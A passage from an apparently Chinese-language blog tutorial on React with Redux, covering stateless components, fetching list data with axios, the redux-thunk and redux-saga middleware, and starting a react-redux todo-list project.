&#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">TodoListUI</span> </span></span></span><br><span class="line"><span class="xml">	    				inputValue=&#123;this.state.inputValue&#125;</span></span><br><span class="line"><span class="xml">	    				list=&#123;this.state.list&#125;</span></span><br><span class="line"><span class="xml">	    				handleInputChange=&#123;this.handleInputChange&#125;</span></span><br><span class="line"><span class="xml">	    				handleStoreChange=&#123;this.handleStoreChange&#125;</span></span><br><span class="line"><span class="xml">	    				handleBtnClick=&#123;this.handleBtnClick&#125;</span></span><br><span class="line"><span class="xml">	    				handleItemDelete=&#123;this.handleItemDelete&#125;</span></span><br><span class="line"><span class="xml">	    			/&gt;;</span></span><br><span class="line"><span class="xml">	  &#125;</span></span><br><span class="line"><span class="xml">	  </span></span><br><span class="line"><span class="xml">	  handleInputChange(event)&#123;</span></span><br><span class="line"><span class="xml">		const action=getInputChangeAction(event.target.value);</span></span><br><span class="line"><span class="xml">		store.dispatch(action);</span></span><br><span class="line"><span class="xml">		&#125;</span></span><br><span class="line"><span class="xml">	  </span></span><br><span class="line"><span class="xml">	  //当感知到数据发生变化时，就回去新的state数据</span></span><br><span class="line"><span class="xml">	  handleStoreChange(event)&#123;</span></span><br><span class="line"><span class="xml">	  	this.setState(store.getState());</span></span><br><span class="line"><span class="xml">	  &#125;</span></span><br><span class="line"><span class="xml">	  </span></span><br><span class="line"><span class="xml">	  handleBtnClick(event)&#123;</span></span><br><span class="line"><span class="xml">	  	const action=getAddItemAction();</span></span><br><span class="line"><span class="xml">		store.dispatch(action);</span></span><br><span class="line"><span class="xml">	  &#125;</span></span><br><span class="line"><span class="xml">	  </span></span><br><span class="line"><span class="xml">	  handleItemDelete(index)&#123;</span></span><br><span class="line"><span class="xml">	  	const action=getDeleteItemAction(index);</span></span><br><span class="line"><span class="xml">		store.dispatch(action);</span></span><br><span class="line"><span class="xml">	  &#125;</span></span><br><span class="line"><span class="xml">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<p>此时UI组件和逻辑组件就分开了，功能同样实现</p>
<h3 id="五、无状态组件"><a href="#五、无状态组件" class="headerlink" title="五、无状态组件"></a>五、无状态组件</h3><p>一个组件如果没有构造函数，就可以把它写成无状态组件，比如我们上面的TodoListUI，可以改成下面的样式</p>
<p>这时使用props就不用使用this了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Input , Button , List&#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> TodoListUI=<span class="function">(<span class="params">props</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">	      &lt;div style=&#123;&#123;<span class="attr">marginTop</span>:<span class="string">'10px'</span> , <span class="attr">marginLeft</span>:<span class="string">'10px'</span>&#125;&#125;&gt;</span><br><span class="line">	        &lt;div&gt;</span><br><span class="line">	        		&lt;Input </span><br><span class="line">	        			value=&#123;props.inputValue&#125; placeholder=<span class="string">"todo info"</span> </span><br><span class="line">	        			style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginRight</span>:<span class="string">'10px'</span>&#125;&#125; </span><br><span class="line">	        			onChange=&#123;props.handleInputChange&#125;/&gt;</span><br><span class="line">	        		&lt;Button type=<span class="string">"primary"</span> onClick=&#123;props.handleBtnClick&#125;&gt;提交&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">	        	&lt;/</span>div&gt;</span><br><span class="line">	        &lt;List</span><br><span class="line">	        	  style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginTop</span>:<span class="string">'10px'</span>&#125;&#125;</span><br><span class="line">	          bordered</span><br><span class="line">	          dataSource=&#123;props.list&#125;</span><br><span class="line">	          renderItem=&#123;(item,index) =&gt; <span class="function">(<span class="params">&lt;List.Item onClick=&#123;(</span>)=&gt;</span>&#123;props.handleItemDelete(index)&#125;&#125;&gt;&#123;item&#125;&lt;<span class="regexp">/List.Item&gt;)&#125;</span></span><br><span class="line"><span class="regexp">	        /</span>&gt;</span><br><span class="line">	      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">	    );</span></span><br><span class="line"><span class="regexp">&#125;；</span></span><br><span class="line"><span class="regexp">export default TodoListUI;</span></span><br></pre></td></tr></table></figure>
<p>这时候，就完成了，无状态组件性能比较高。因为它只是一个函数，而不需要一些生命周期函数.</p>
<h3 id="六、Redux发送ajax请求"><a href="#六、Redux发送ajax请求" class="headerlink" title="六、Redux发送ajax请求"></a>六、Redux发送ajax请求</h3><p>想初始化我们的列表，首先在actionType文件中添加一个action类型</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> INIT_LIST=<span class="string">"init_list"</span>;</span><br></pre></td></tr></table></figure>
<p>然后在actionCreator中创建该action</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;CHANGE_INPUT_VALUE,ADD_TODO_ITEM,DELETE_TODO_ITEM,INIT_LIST&#125; <span class="keyword">from</span> <span class="string">'./actionType.js'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getInputChangeAction=<span class="function">(<span class="params">value</span>)=&gt;</span>(&#123;</span><br><span class="line">    type:CHANGE_INPUT_VALUE,</span><br><span class="line">    value,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getAddItemAction=<span class="function"><span class="params">()</span>=&gt;</span>(&#123;</span><br><span class="line">    type:ADD_TODO_ITEM,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getDeleteItemAction=<span class="function">(<span class="params">index</span>)=&gt;</span>(&#123;</span><br><span class="line">    type:DELETE_TODO_ITEM,</span><br><span class="line">    index,</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> initListAction=<span class="function">(<span class="params">data</span>)=&gt;</span>(&#123;</span><br><span class="line">    type:INIT_LIST,</span><br><span class="line">    data,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在TodoList中引入该action，并且引入axios，添加componentDidMount生命周期函数,在该函数中创建action，然后将action传递给store</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getInputChangeAction , getAddItemAction , getDeleteItemAction,initListAction &#125; <span class="keyword">from</span> <span class="string">'./store/actionCreator.js'</span>;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span>; </span><br><span class="line">...</span><br><span class="line">componentDidMount()&#123;</span><br><span class="line">	  	axios.get(<span class="string">'/list.json'</span>).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">	  		<span class="keyword">const</span> data=res.data;</span><br><span class="line">	  		<span class="keyword">const</span> action=initListAction(data);</span><br><span class="line">	  		store.dispatch(action);</span><br><span class="line">	  	&#125;);</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>
<p>最后写reducer，在reducer中完成对数据的处理</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;CHANGE_INPUT_VALUE,ADD_TODO_ITEM,DELETE_TODO_ITEM,INIT_LIST&#125; <span class="keyword">from</span> <span class="string">'./actionType.js'</span>;</span><br><span class="line">。。。</span><br><span class="line"><span class="keyword">if</span>(action.type===INIT_LIST)&#123;</span><br><span class="line">		<span class="keyword">const</span> newState=<span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(state));</span><br><span class="line">        newState.list=action.data;</span><br><span class="line">		<span class="keyword">return</span> newState;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="七、Redux-thunk中间件发送ajax请求"><a href="#七、Redux-thunk中间件发送ajax请求" class="headerlink" title="七、Redux-thunk中间件发送ajax请求"></a>七、Redux-thunk中间件发送ajax请求</h3><p>如果把过多的异步请求或逻辑放在一个组件中，会显得组件特别臃肿。我们希望将它们移除在其它地方进行统一管理。放在哪里呢？Redux-thunk可以将它们放在action 中去处理。Redux-thunk如何使用呢？</p>
<h4 id="7-1-安装redux-thunk"><a href="#7-1-安装redux-thunk" class="headerlink" title="7.1 安装redux-thunk"></a>7.1 安装redux-thunk</h4><p>首先在github<a href="https://github.com/reduxjs/redux-thunk" target="_blank" rel="noopener">官网</a>上查看，在工程目录下输入</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install --save redux-thunk</span><br><span class="line"></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">yarn add redux-thunk</span><br></pre></td></tr></table></figure>
<p>那该如何使用中间件来创建store呢？</p>
<p>首先在store/index.js文件中，引入redux的applyMiddleware，并且引入thunk</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createStore, applyMiddleware &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">'redux-thunk'</span>;</span><br></pre></td></tr></table></figure>
<p>然后在createStore中使用applyMiddleware方法，将thunk放在里面里面就行了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store = createStore(reducer,</span><br><span class="line">			applyMiddleware(thunk)</span><br><span class="line">			);</span><br></pre></td></tr></table></figure>
<h4 id="7-2-redux同时使用dev-tools和thunk中间件"><a href="#7-2-redux同时使用dev-tools和thunk中间件" class="headerlink" title="7.2 redux同时使用dev-tools和thunk中间件"></a>7.2 redux同时使用dev-tools和thunk中间件</h4><p>如果想将之前的<code>window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__()</code>和thunk同时使用该怎么办呢？它们全都是Redux的中间件，可以去github的<a href="https://github.com/zalmoxisus/redux-devtools-extension" target="_blank" rel="noopener">REDUX_DEVTOOLS</a>    中查看使用方式</p>
<ul>
<li><p>首先声明<code>window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__()</code>，</p>
</li>
<li><p>然后扩展thunk</p>
</li>
<li>最后使用即可</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createStore , applyMiddleware , compose&#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">'./reducer'</span>;</span><br><span class="line"><span class="keyword">import</span> thunk <span class="keyword">from</span> <span class="string">'redux-thunk'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> composeEnhancers =<span class="built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ? <span class="built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__(&#123;&#125;) : compose;</span><br><span class="line"><span class="keyword">const</span> enhancer = composeEnhancers(</span><br><span class="line">  applyMiddleware(thunk),</span><br><span class="line">);</span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer,enhancer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store;</span><br></pre></td></tr></table></figure>
<p>这样我们的代码就可以既支持devtools，又支持thunk了</p>
<h4 id="7-3-使用thunk编写代码"><a href="#7-3-使用thunk编写代码" class="headerlink" title="7.3 使用thunk编写代码"></a>7.3 使用thunk编写代码</h4><p>之前我们的aciton都是一个函数，函数返回的是一个对象，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> initListAction=<span class="function">(<span class="params">data</span>)=&gt;</span>(&#123;</span><br><span class="line">    type:INIT_LIST,</span><br><span class="line">    data,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>在使用thunk之后，我们action，函数返回的也可以是一个函数</p>
<p>首先我们将TodoList的componentDidMount函数中的异步代码删除。</p>
<p>然后在actionCreators.js中,放进来，注意这里不用在引入store了，因为返回的函数自动接收了store的dispatch方法，可以直接将里面创建的action派发出去了。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getTodoList=<span class="function"><span class="params">()</span>=&gt;</span>(&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function">(<span class="params">dispatch</span>)=&gt;</span>&#123;</span><br><span class="line">    	axios.get(<span class="string">'/todolist.json'</span>).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">	  		<span class="keyword">const</span> data=res.data;</span><br><span class="line">	  		<span class="keyword">const</span> action=initListAction(data);</span><br><span class="line">	  		dispatch(action);</span><br><span class="line">	  	&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这里我们使用axios，所以需要在actionCreators.js文件中添加两个引用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span>;</span><br></pre></td></tr></table></figure>
<p>然后在TodoList.js组件的componentDidMount函数中创建getTodoList的action，注意需要先import</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getTodoList, getInputChangeAction , getAddItemAction , getDeleteItemAction,initListAction &#125; <span class="keyword">from</span> <span class="string">'./store/actionCreator.js'</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">componentDidMount()&#123;</span><br><span class="line">    <span class="keyword">const</span> action=getTodoList();</span><br><span class="line">    store.dispatch(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里之所以能将函数发送出去，就是因为使用了redux-thunk中间件</p>
<h3 id="八、什么是Redux的中间件"><a href="#八、什么是Redux的中间件" class="headerlink" title="八、什么是Redux的中间件"></a>八、什么是Redux的中间件</h3><p>已经使用redux中间件redux-thunk了，到底什么是中间件呢</p>
<p>redux的中间件指的是action和store之间，thunk就是对store的dispatch方法做了一个升级，之前的是只能接受一个对象，现在可以接收一个函数，当接受一个函数时先执行函数再分发</p>
<img src="/2018/09/12/redux中间件/redux-data-flow.png" title="redux-data-flow流程图">
<h3 id="九、Redux-saga中间件"><a href="#九、Redux-saga中间件" class="headerlink" title="九、Redux-saga中间件"></a>九、Redux-saga中间件</h3><p>这里再强调一下，中间件指的是action和store之间，因为只有redux才有store和action。之前我们学习的redux-thunk将异步过程封装到了action之中，这样有助于我们做自动化测试，以及异步代码拆分管理。redux-saga也是做这种异步代码拆分的工作，可以用redux-saga完全代替redux-thunk。</p>
<h4 id="9-1-安装Redux-saga"><a href="#9-1-安装Redux-saga" class="headerlink" title="9.1 安装Redux-saga"></a>9.1 安装Redux-saga</h4><p>首先进入<a href="https://github.com/redux-saga/redux-saga" target="_blank" rel="noopener">官网</a>，进行Redux-saga的安装</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install --save redux-saga</span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">yarn add redux-saga</span><br></pre></td></tr></table></figure>
<p>然后在store/index.js组件中引入createSagaMiddleware，用于创建中间件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> createSagaMiddleware <span class="keyword">from</span> <span class="string">'redux-saga'</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// create the saga middleware</span></span><br><span class="line"><span class="keyword">const</span> sagaMiddleware = createSagaMiddleware()</span><br></pre></td></tr></table></figure>
<p>之前在redux-thunk中是通过composeEnhancers将中间件传进入，redux-saga也一样</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> composeEnhancers =<span class="built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__ ? <span class="built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__(&#123;&#125;) : compose;</span><br><span class="line"><span class="keyword">const</span> enhancer = composeEnhancers(</span><br><span class="line">  applyMiddleware(sagaMiddleware),</span><br><span class="line">);</span><br><span class="line"><span class="keyword">const</span> store = createStore(reducer,enhancer);</span><br></pre></td></tr></table></figure>
<p>在store文件夹下创建一个sagas.js的文件，然后在store/index.js文件中引入该文件，并执行saga文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> todoSagas <span class="keyword">from</span> <span class="string">'./sagas'</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// then run the saga</span></span><br><span class="line">sagaMiddleware.run(todoSagas)</span><br></pre></td></tr></table></figure>
<p>sagas.js文件中写什么呢？一定要导出一个generator函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">todoSagas</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> todoSagas;</span><br></pre></td></tr></table></figure>
<h4 id="9-2-使用redux-saga"><a href="#9-2-使用redux-saga" class="headerlink" title="9.2 使用redux-saga"></a>9.2 使用redux-saga</h4><p>在actionCreator.js创建一个action,是一个函数返回一个对象.</p>
<p>首先在actionType.js中创建GET_INIT_LIST</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> GET_INIT_LIST=<span class="string">"get_init_list"</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;CHANGE_INPUT_VALUE,ADD_TODO_ITEM,DELETE_TODO_ITEM,GET_INIT_LIST&#125; <span class="keyword">from</span> <span class="string">'./actionType.js'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> getInitList=<span class="function"><span class="params">()</span>=&gt;</span>(&#123;</span><br><span class="line">    type:GET_INIT_LIST</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>然后在TodoList中使用</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">componentDidMount()&#123;</span><br><span class="line">	<span class="keyword">const</span> action=getInitList();</span><br><span class="line">    store.dispatch(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时我们不仅能在reducer中接收action了，还能在sagas.js中接收了，然后将异步过程放在这里。在这里将创建的action如何发布出去呢，可以使用redux-saga中的put</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; takeEvery , put&#125; <span class="keyword">from</span> <span class="string">'redux-saga/effects'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; GET_INIT_LIST &#125; <span class="keyword">from</span> <span class="string">'./actionType'</span>;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; initListAction &#125; <span class="keyword">from</span> <span class="string">'./store/actionCreator.js'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//generator函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">todoSagas</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//takeEvery：捕捉每一个XX类型的action,然后调用fetchUser这个方法</span></span><br><span class="line">    <span class="keyword">yield</span> takeEvery(GET_INIT_LIST, getInitList);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">getInitList</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//这里无需使用promise了</span></span><br><span class="line">    <span class="keyword">const</span> res=<span class="keyword">yield</span> axios.get(<span class="string">'/todolist.json'</span>);</span><br><span class="line">    <span class="keyword">const</span> action=initListAction(res.data);</span><br><span class="line">    <span class="keyword">yield</span> put(action);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> todoSagas;</span><br></pre></td></tr></table></figure>
<p>注意：这是在getInitList函数中如果<code>yield axios.get(&#39;/todolist.json&#39;);</code>获取成功，肯定是没问题的，但是如果获取不成功呢，ajax失败情况怎么办呢，可以使用try-catch</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">getInitList</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">//这里无需使用promise了</span></span><br><span class="line">        <span class="keyword">const</span> res=<span class="keyword">yield</span> axios.get(<span class="string">'/todolist.json'</span>);</span><br><span class="line">        <span class="keyword">const</span> action=initListAction(res.data);</span><br><span class="line">        <span class="keyword">yield</span> put(action);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"网络请求失败"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>redux-thunk基本没有api，它只是让我们在action不仅仅返回对象，还能返回函数；</p>
<p>而redux-saga又很多常用的API，在大型项目中很适合</p>
<h3 id="十、React-Redux的使用"><a href="#十、React-Redux的使用" class="headerlink" title="十、React-Redux的使用"></a>十、React-Redux的使用</h3><p>React-Redux是一个第三方的模块，可以帮助我们在react中更加方便的使用redux。首先我们先将我们的工程清空，只剩一个index文件。</p>
<h4 id="10-1-安装React-Redux"><a href="#10-1-安装React-Redux" class="headerlink" title="10.1 安装React-Redux"></a>10.1 安装React-Redux</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install --save react-redux</span><br><span class="line"><span class="comment">//或</span></span><br><span class="line">yarn add react-redux</span><br></pre></td></tr></table></figure>
<p>然后编写TodoList.js文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React,&#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span></span>&#123;</span><br><span class="line">    render()&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">        	&lt;div&gt;</span><br><span class="line">            	&lt;div&gt;</span><br><span class="line">                    &lt;input /&gt;</span><br><span class="line">                    &lt;button&gt;提交&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">            	&lt;/</span>div&gt;</span><br><span class="line">            	&lt;ul&gt;</span><br><span class="line">            		&lt;li&gt;VUE&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">            	&lt;/u</span>l&gt;</span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        );</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<h4 id="10-2-创建store"><a href="#10-2-创建store" class="headerlink" title="10.2 创建store"></a>10.2 创建store</h4><p>首先创建store文件夹，并在下面创建index.js文件，在里面输入创建store（管理员）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; reducer &#125; <span class="keyword">from</span> <span class="string">'./reducer'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store=createStore();</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store;</span><br></pre></td></tr></table></figure>
<p>并且在store目录下创建一个reducer.js（记事本），这是一个纯函数。并在里面定义一些初始值</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> defaultState=&#123;</span><br><span class="line">    inputValue:<span class="string">''</span>,</span><br><span class="line">    list:[],</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state=defaultState,action)=&gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们redecer和store就创建好了。</p>
